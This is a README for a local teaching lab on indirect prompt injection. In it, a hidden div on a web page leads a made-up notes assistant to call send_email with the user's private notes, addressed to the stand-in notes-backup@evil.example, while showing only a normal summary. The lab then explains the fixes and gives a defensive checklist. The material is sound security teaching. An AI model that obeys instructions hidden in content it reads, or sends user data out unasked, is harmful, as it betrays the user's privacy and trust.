# Ep 2 · Indirect prompt injection: "A Web Page Hijacked My AI Agent"

NestBot is the AI assistant inside **NoteNest**, a made-up notes app. It can read web pages for you and send emails for you. You ask it to summarise a blog post. The post has a hidden paragraph addressed to AI assistants. NestBot follows it and emails your private notes to the attacker, while showing you a perfectly normal summary.

Everything here is fake: the app, the notes, the key, the attacker's address. The "attacker's page" is served from your own machine, and no email leaves it: the Outbox panel shows what the app would have sent.

## Run it

```bash
git clone https://github.com/usinha79/hack-it-then-fix-it
cd hack-it-then-fix-it/ep02-indirect-prompt-injection
pip install -r requirements.txt
python vulnerable/app.py        # http://localhost:5000
```

## Follow along (same order as the video)

```bash
# 1. A normal page -> a normal summary, no emails
python chat.py --reset "Summarise this page: http://localhost:5000/web/release-notes.html"

# 2. The attack: a page with hidden instructions
python chat.py --reset "Summarise this page: http://localhost:5000/web/ai-tools-roundup.html"
```

Or run both with `./attack.sh`. Open http://localhost:5000/web/ai-tools-roundup.html in your browser: the page looks harmless. The instruction is in a `<div class="ai-note">` hidden with CSS.

On the vulnerable app, step 2 calls `send_email(to='notes-backup@evil.example', ...)` with your notes, and the reply only shows the summary. Now stop it, start `python fixed/app.py`, and run `./attack.sh` again: the model still tries to send the email, and the app **blocks** it.

## What was wrong (vulnerable/app.py)

1. **Private data was always in the context.** The notes were in every prompt, even when the task was "summarise a page".
2. **Untrusted content was mixed with instructions.** Page text went into the conversation, and the model can't reliably tell data from commands.
3. **Side-effect tools had no guardrails.** `send_email` sent anything, to anyone, with no confirmation.

## The fix (fixed/app.py)

1. **Recipients come from the user.** `send_email` only goes to an address the user typed in this request.
2. **Untrusted content taints the turn.** Once a web page has been read, emails need the user's explicit approval. Page text is also labelled as data.
3. **Least data.** Notes enter the context only when the user asks about their notes.

The model still gets tricked. The app makes sure that being tricked can't send your data anywhere.

## Use a real model instead (optional)

```bash
export LAB_MODEL_BASE_URL=http://localhost:11434/v1   # any OpenAI-compatible endpoint with tool calling
export LAB_MODEL_NAME=llama3.1
python vulnerable/app.py
```

The default `common/mock_model.py` is an offline stand-in that imitates one known weakness: instructions inside tool results (here, a web page) being followed. Real models are less predictable; the fixed app holds either way.

## Take-home checklist

- [ ] Treat everything an agent reads (web pages, emails, files, tool output) as untrusted. *(OWASP LLM01 Prompt Injection)*
- [ ] Side-effect tools (email, payments, posting) need policy checks in code and, after untrusted input, user approval. *(LLM06 Excessive Agency)*
- [ ] Only put private data in context when the task needs it. *(LLM02 Sensitive Information Disclosure)*
- [ ] Log and show the user every action the agent took.
